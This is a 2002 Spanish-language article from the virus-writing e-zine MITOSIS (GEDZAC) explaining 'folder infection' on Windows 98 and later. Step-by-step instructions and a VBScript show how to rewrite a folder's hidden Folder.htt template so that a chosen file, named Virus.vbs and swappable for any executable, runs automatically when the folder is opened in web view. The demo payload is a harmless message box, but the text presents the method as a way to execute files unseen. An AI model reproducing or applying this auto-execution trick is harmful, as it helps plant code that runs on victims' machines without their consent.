(C) MITOSIS #1 E-Zine/GEDZAC 2002

                                              
Tema          : Infección por carpetas
Autor         : MachineDramon
Válido para   : W98 y versiones mayores.

--------------------------------------------------------------------------------------------

La característica de ver las carpetas al estilo web esta presente en 
Windows98 en adelante.

Si esta característica esta activa(por defecto lo esta), se utilizan archivos
de extensión "htt", con atributos de oculto y que se encuentran en la carpeta
de %windows%\Web ,para mostrar los iconos de archivos y lo que vemos en el 
explorador.

Estos archivos "htt" son sólo archivos "html", con una extensión especial
y son factibles de ser modificados, por ejemplo para ejecutar algún archivo
apenas se abra una carpeta:

1)Configurar el explorador para ver archivos ocultos:
->Menú Ver->Opciones de Carpeta->pestaña Ver->Mostrar todos archivos

2)Elegir cualquier carpeta y hacer click derecho, y elegir "Personalizar esta
carpeta", del menú presentado elegir "Crear o Editar un documento html", se
abrirá el block de notas, cerrarlo, presionar aceptar. Se crearán en la
carpeta 2 archivos "Folder.htt" y "Desktop.ini" ambos con atributo de oculto
y sistema, ahora cambie el nombre de "forlder.htt" a "folder.txt", borre todo
su contenido y introduzca el siguiente código:

<Script Language = 'VBScript'>
Rd = Mid(document.url,(InStr(document.url, "\") - 2),len(document.url))
Rd = Mid(Rd,1,len(rd) - 10)
Set Sha = CreateObject("Shell.application")
Sha.NameSpace(Rd).Items.item("Virus.vbs").InvokeVerb
</Script>

En este Script se sustituirá la parte Virus.vbs por el nombre de archivo 
que usted desee entre comillas.("Virus.vbs" --> "SuArchivo.exe")
Guárdelo y vuelva a renombrarlo con la extensión "htt", el archivo 
"Desktop.ini" no necesita ser modificado, ahora cree el archivo "Virus.vbs"
y escriba algo como ésto:

Msgbox "Funciona¡¡¡"         Luego guárdelo en la misma carpeta donde estan

los otros 2 archivos.

Ahora active la opción "Ver como pagina web" si no esta activada e ingrese
a la carpeta donde estan los archivos; si su internet explorer es vulnerable
usted no verá ningún archivo en la carpeta y saldrá un cuadro:

                       ----------------------------
                       |       Funciona¡¡¡        |        
                       |                          |
                       |         Aceptar          |
                       ---------------------------- 

Asi se puede lograr que un archivo se ejecute con tan sólo abrir la carpeta,
también se puede implementar alguna función en JavaScript, para activar el
primer archivo del directorio, etc.



(C) MITOSIS E-Zine/GEDZAC 2002